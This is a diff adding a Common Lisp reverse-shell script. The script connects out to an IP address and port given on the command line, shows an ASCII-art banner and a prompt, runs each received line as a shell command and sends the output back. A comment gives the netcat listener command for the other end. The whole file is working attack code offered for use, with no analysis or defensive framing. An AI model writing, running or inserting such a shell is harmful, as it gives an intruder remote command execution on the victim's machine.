@@ -1,0 +1,35 @@
+(defun execute-command (cmd) ; nc -l -p 13377
+  (with-output-to-string (output)
+    (with-open-stream (process (ext:run-shell-command cmd :output :stream))
+      (loop for line = (read-line process nil)
+            while line do
+            (format output "~a~%" line)))))
+
+(defun reverse-shell (ip po)
+  (let ((we "  _____            _      _____          _      ~% |  __ \\          | |    / ____|        | |     ~% | |__) |___  __ _| |___| |     ___   __| | ___ ~% |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\ ~% | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/ ~% |_|  \\_\\___|\\__,_|_/___|\\_____|\\___/ \\__,_|\\___| ~%"))
+    (let* ((client-ip (sb-ext:hostname))
+           (socket (sb-bsd-sockets:socket-connect :remote-host ip :remote-port po))
+           (input (sb-bsd-sockets:socket-make-stream socket :input t :element-type 'character :external-format '(:utf-8 :eol-style :lf)))
+           (output (sb-bsd-sockets:socket-make-stream socket :output t :element-type 'character :external-format '(:utf-8 :eol-style :lf))))
+      (write-string we output)
+      (terpri output)
+      (loop
+         (write-string " $ " output)
+         (finish-output output)
+         (let ((cmd (read-line input nil)))
+           (setq cmd (string-trim '(#\Space #\Tab #\Newline) cmd))
+           (when (string= cmd "exit")
+             (close socket :abort t)
+             (return))
+           (let ((cmd-output (execute-command cmd)))
+             (write-string cmd-output output)
+             (terpri output)))))))
+
+(defun main ()
+  (if (= sb-ext:*posix-arg-count* 2)
+      (let ((ip (nth 0 sb-ext:*posix-args*))
+            (po (parse-integer (nth 1 sb-ext:*posix-args*))))
+        (reverse-shell ip po))
+      (format t "Please provide the IP address and port as command-line arguments.~%")))
+
+(main)
